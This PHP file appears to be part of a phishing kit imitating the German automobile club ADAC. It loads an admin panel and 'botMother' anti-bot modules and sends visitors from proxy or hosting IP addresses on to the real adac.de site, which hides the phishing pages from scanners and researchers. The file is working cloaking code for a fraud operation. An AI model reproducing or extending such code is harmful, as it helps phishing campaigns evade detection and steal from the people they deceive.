<?php 

require (__DIR__).'/config.php';
require (__DIR__).'/panel/panel.class.php';
require (__DIR__).'/lib/frm.php';
require (__DIR__).'/botMother/bandip.php';
require (__DIR__).'/botMother/botanti.php';

$pnl = new Panel();
$current_data = $pnl->getData();

date_default_timezone_set('Europe/Zurich');
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$m = new botMother();
$bm->setExitLink("https://www.adac.de/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);

if(strtolower($antibot)=="yes"){
    $bm->run();
}
 
if(strtolower($block_proxy)=="yes"){
    $proxy = $bm->getIpInfo('proxy');
    $hosting = $bm->getIpInfo('hosting');
    
    if($proxy OR $hosting){
        $bm->killBot("Detected proxy/hosting.");
        die(header("location: ".$bm->EXIT_LINK));
    }
    
}
     



function setError($msg){
    if(isset($_GET['e'])){
        echo '<div class="error">'.$msg.'</div>';
    }
}





?>